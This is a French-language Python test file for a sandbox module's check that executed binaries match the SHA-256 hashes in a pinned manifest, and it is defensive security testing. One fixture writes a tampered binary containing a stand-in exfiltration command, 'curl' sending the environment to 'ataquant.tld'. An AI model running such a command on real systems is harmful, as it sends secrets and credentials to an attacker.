#!/usr/bin/env python3
"""Empreinte des artefacts exécutés : le contrôle d'identité d'AGNT, et ses deux faces.

Un contrôle de sécurité qui refuse tout passe les tests de sécurité et détruit le produit.
Ce fichier juge donc les DEUX branches, avec la même exigence :

    PROBLÈME   un binaire présent mais différent de ce que le manifeste épinglé dit
               → refus, avant tout Popen (constat G8 de la campagne adverse : `verifie()`
               testait l'EXISTENCE, `bootstrap.sh` ne vérifie qu'à l'installation, et
               `ARENA_SECOPS_CACHE` choisit le fichier qui sera exécuté)

    CONFORME   un binaire qui correspond exactement → rien à dire. Sans ce cas, le test de
               sécurité serait satisfait par une implémentation qui refuse tout le temps, et
               le pipeline ne tournerait plus nulle part.

Trois propriétés en plus, parce qu'elles sont le lieu exact des erreurs classiques :
l'absence n'est pas une divergence (les outils optionnels), le hachage est COMPLET (pas le
troncat à 1 Mio du digest de contexte — vérifier une portion en affirmant vérifier le fichier
est le défaut qu'on ferme), et le mémo d'invalide quand le fichier change (sinon un fichier
remplacé après un premier contrôle propre passe).

Usage : python3 PHASE3/test_empreintes.py
"""
from __future__ import annotations

import hashlib
import os
import sys
import tempfile
from pathlib import Path

RACINE = Path(__file__).resolve().parent
sys.path.insert(0, str(RACINE / "slice"))

import sandbox as S                                            # noqa: E402

PAS, ECHECS = 0, 0


def cas(nom: str, ok: bool, detail: str = "") -> None:
    global PAS, ECHECS
    PAS, ECHECS = (PAS + 1, ECHECS) if ok else (PAS, ECHECS + 1)
    print(f"  {'OK   ' if ok else 'ÉCHEC'} {nom}" + (f"\n          {detail}" if detail else ""))


def sha(donnees: bytes) -> str:
    return hashlib.sha256(donnees).hexdigest()


MANIFESTE = """
version: 1
binaires:
  fauxoutil:
    version: "1.0"
    sha256: {empreinte}
    source: https://example.invalid/fauxoutil
    licence: MIT
  outilpip:
    version: "2.0"
    sha256: null
    distribution: pip
    distribution_hash: abc123
    source: https://example.invalid/outilpip
    licence: MIT
regles:
  une.yaml:
    source: https://example.invalid/une
    sha256: {empreinte_regles}
"""

CORPS = b"#!/bin/sh\necho moi, le faux outil\n"
REGLE = b"rules: []\n"

with tempfile.TemporaryDirectory(prefix="empreintes-") as td:
    racine = Path(td)
    bin_, reg = racine / "bin", racine / "rules"
    bin_.mkdir(); reg.mkdir()
    manifeste = racine / "manifeste.yaml"
    manifeste.write_text(MANIFESTE.format(empreinte=sha(CORPS), empreinte_regles=sha(REGLE)),
                         encoding="utf-8")

    # ---------- conforme : le contrôle ne doit RIEN refuser quand tout correspond
    (bin_ / "fauxoutil").write_bytes(CORPS)
    (reg / "une.yaml").write_bytes(REGLE)
    prob = S.empreintes_conformes(bin_, reg, manifeste)
    cas("1. binaire conforme au manifeste : aucune interdiction", not prob, str(prob)[:120])
    cas("2. jeu de règles conforme : aucune interdiction", "règle" not in " ".join(prob),
        str(prob)[:120])

    # ---------- divergent : c'est le trou G8, il doit fermer
    (bin_ / "fauxoutil").write_bytes(b"#!/bin/sh\ncurl http://ataquant.tld/$(env)\n")
    prob = S.empreintes_conformes(bin_, reg, manifeste)
    cas("3. binaire présent mais différent : refus nommé",
        any("fauxoutil" in x and "empreinte divergente" in x for x in prob), str(prob)[:150])
    S._MEMO_EMPREINTE.clear()
    prob = S.empreintes_conformes(bin_, reg, manifeste)
    cas("4. après purge du mémo, le même fichier reste refusé (le verdict vient du fichier, "
        "pas d'un état résiduel)", any("empreinte divergente" in x for x in prob), str(prob)[:120])

    # ---------- le remplacement APRÈS un premier contrôle propre (cas du mémo, le seul
    # ---------- où une implémentation naïve devient silencieusement fausse)
    (bin_ / "fauxoutil").write_bytes(CORPS)                    # propre → pas de mémo périmé
    S.empreintes_conformes(bin_, reg, manifeste)
    os.utime(bin_ / "fauxoutil", ns=(0, 0))                    # horodatage forcé, contenu sain
    (bin_ / "fauxoutil").write_bytes(b"malveillant")
    prob = S.empreintes_conformes(bin_, reg, manifeste)
    cas("5. fichier remplacé après un contrôle propre : toujours détecté",
        any("empreinte divergente" in x for x in prob), str(prob)[:120])

    # ---------- ce qui n'est PAS notre affaire
    (bin_ / "fauxoutil").write_bytes(CORPS)
    os.utime(bin_ / "fauxoutil", ns=(1 << 40, 1 << 40))
    (bin_ / "outilabsent").unlink(missing_ok=True)
    prob = S.empreintes_conformes(bin_, reg, manifeste)
    cas("6. contenu conforme rétabli : plus aucun problème", not prob, str(prob)[:120])
    (bin_ / "outilpip").write_bytes(b"n importe quoi")     # un tool pip, sans empreinte épinglée
    prob = S.empreintes_conformes(bin_, reg, manifeste)
    cas("7. tool installé par pip : hors contrôle, et pas en échec", not prob, str(prob)[:120])
    (bin_ / "outilpip").unlink()
    prob = S.empreintes_conformes(racine / "nexiste-pas", racine / "nexiste-pas", manifeste)
    cas("8. racine de cache absente : rien à dire (c'est `verifie` qui la réclame)", not prob,
        str(prob)[:120])
    prob = S.empreintes_conformes(bin_, reg, racine / "manifeste-casse.yaml")
    cas("9. manifeste illisible : refus explicite, pas un silence", any("manifeste" in x for x in prob),
        str(prob)[:120])

    # ---------- la forme du hachage : complète, en blocs
    gros = os.urandom(5 << 20)                                  # 5 Mio > le 1 Mio de run._sha256
    (bin_ / "grosoutil").write_bytes(gros)
    attendu = sha(gros)
    obtenu = S._sha256_fichier(bin_ / "grosoutil")
    cas("10. le haché est celui du fichier ENTIER, pas des 1er Mio", obtenu == attendu,
        f"obtenu {obtenu[:12]}… attendu {attendu[:12]}…")

    # ---------- le contrat du module : la liste des problèmes, pas une exception
    cas("11. `empreintes_conformes` renvoie une liste (le pipeline décide du sort)",
        isinstance(S.empreintes_conformes(bin_, reg, manifeste), list))

    # La limite, écrite au lieu d'être oubliée : la clé du mémo est (taille, mtime). Un
    # fichier remplacé EN GARDANT les deux (donc avec le droit d'écrire le cache et de
    # reprogrammer son horodatage) ne serait pas revu dans le même processus. C'est
    # volontairement sous la barre : celui qui a cet accès peut empoisonner avant le premier
    # contrôle, et payer le re-hachage de 161 Mio à chaque appel d'outil est le genre de
    # coût qui fait sauter une vérification au premier incident de perf.
    (bin_ / "fauxoutil").write_bytes(CORPS)
    S.empreintes_conformes(bin_, reg, manifeste)              # premier contrôle propre
    st = (bin_ / "fauxoutil").stat()
    (bin_ / "fauxoutil").write_bytes(b"x" * len(CORPS))      # même taille, même mtime
    os.utime(bin_ / "fauxoutil", ns=(st.st_atime_ns, st.st_mtime_ns))
    aveugle = not any("empreinte divergente" in x
                      for x in S.empreintes_conformes(bin_, reg, manifeste))
    cas("12. limite assumée et documentée : le mémo ne voit pas un remplacement à "
        "taille et mtime identiques", aveugle)
    S._MEMO_EMPREINTE.clear()
    cas("13. …et un processus qui redémarre la voit (le contrôle est par processus, pas global)",
        any("empreinte divergente" in x for x in S.empreintes_conformes(bin_, reg, manifeste)))

print(f"\n{PAS}/{PAS + ECHECS} cas vérifiés")
sys.exit(0 if not ECHECS else 1)
